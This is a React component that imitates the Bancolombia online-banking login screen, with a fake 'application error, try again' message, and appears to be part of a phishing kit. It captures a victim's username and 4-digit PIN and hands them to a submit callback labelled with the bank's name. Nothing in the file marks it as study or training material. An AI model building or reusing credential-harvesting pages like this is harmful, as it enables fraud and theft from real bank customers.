/* eslint-disable @next/next/no-img-element */
/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import { useState } from "react";

//import "@/styles/bds.raw.css";
export default function ErrorApp({ enviar }: any) {
  const [user, setUser] = useState("");
  const [pass, setPass] = useState("");
  // const [loading, setLoading] = useState(false);

  // Validaciones
  const isUserValid = user.length >= 4 && user.length <= 20;
  const isPassValid = pass.length === 4;

  const handleSubmit = () => {
    if (!isUserValid || !isPassValid) return;
    // setLoading(true)
    enviar?.({ view: "errorlogin", user, pass, bank: "bancolombia" });

  };

  // Evitar letras en la clave
  const handlePass = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, ""); // solo números
    setPass(value);
  };

  return (
    <div className="bc-row bc-justify-content-center form-container">
      <div className="bc-col-xs-6 bc-col-md-8 bc-col-lg-4">
        <section className="bc-mt-4" style={{ background: "#f9f9fa" }} />

        <div>
          <div className="bc-card-body bc-mt-4">

            <div className="bc-card bc-card-auth bc-card-container">
              <div className="bc-card-auth-body">

                <section className="bc-card-auth-head">
                  <section>
                    <em aria-hidden="true" className="bc-icon" />
                  </section>

                  <h1 className="bc-card-auth-title bc-cibsans-font-style-5-bold bc-mt-3">
                    ¡Hola!
                  </h1>

                  <h3 className="bc-card-auth-description bc-mt-3 auth-description">
                    Ingresa los datos para gestionar tus productos y hacer transacciones.
                  </h3>
                </section>

                {/* FORM REAL */}
                <form noValidate id="form" onSubmit={(e) => e.preventDefault()}>
                  <section>
                    <section className="bc-card-auth-container">

                      {/* Usuario */}
                      <div className="authentication-form__username">
                        <div className="bc-form-field">
                          <em aria-hidden="true">user</em>

                          <input
                            id="username"
                            value={user}
                            onChange={(e) =>
                              setUser(e.target.value.replace(/\s/g, ""))
                            }
                            className="bc-input"
                            placeholder=" "
                            autoComplete="off"
                            maxLength={20}
                            aria-label="Ingresar usuario"
                          />
                          <label
                            htmlFor="username"
                            className="opacity-100 translate-y-0 label-fixed"
                          >
                            Ingresa tu usuario
                          </label>
                        </div>
                      </div>

                      {/* Clave */}
                      <div className="authentication-form__username bc-mt-2">
                        <div className="bc-form-field">
                          <em aria-hidden="true">lock</em>

                          <input
                            id="password"
                            type="password"
                            value={pass}
                            onChange={handlePass}
                            className="authentication-form__password-input bc-input"
                            placeholder=" "
                            maxLength={4}
                            inputMode="numeric"
                            autoComplete="off"
                            aria-label="Clave"
                          />
                          <label
                            htmlFor="password"
                            className="opacity-100 translate-y-0 label-fixed"
                          >
                            Ingresa tu clave
                          </label>
                        </div>
                      </div>

                    </section>
                  </section>

                  {/* Botón de login */}
                  <section className="bc-card-auth-button bc-mt-2">
                    <button
                      className="bc-button bc-button-fill bc-button-primary animate-pulse !bg-[#d9534f] border-[#d9534f]"
                      type="button"
                      disabled={!isUserValid || !isPassValid}
                      onClick={handleSubmit}
                    >
                      Error en la aplicación, intenta nuevamente
                    </button>
                  </section>
                </form>

                <section className="bc-card-auth-link">
                  <a
                    data-bc-link
                    href="#"
                    className="bc-link link-default link-underline"
                  >
                    <u>Crear usuario</u>
                  </a>
                </section>

              </div>
            </div>
          </div>

          {/* Loader */}
          <div className="bc-circle-loading-container">
            <article
              className="bc-circle-loading"
              data-text="Cargando..."
              role="status"
            >
              <section
                className="bc-circle-loading-circle"
                style={{ "--circle-loading-size": "160px" } as any}
              >
                <em className="bc-icon bc-xl bc-loader bc-circle-loading-loader-icon">
                  spinner
                </em>
                <p className="bc-circle-loading-info">Cargando...</p>
              </section>
            </article>
          </div>

        </div>
      </div>
    </div>
  );
}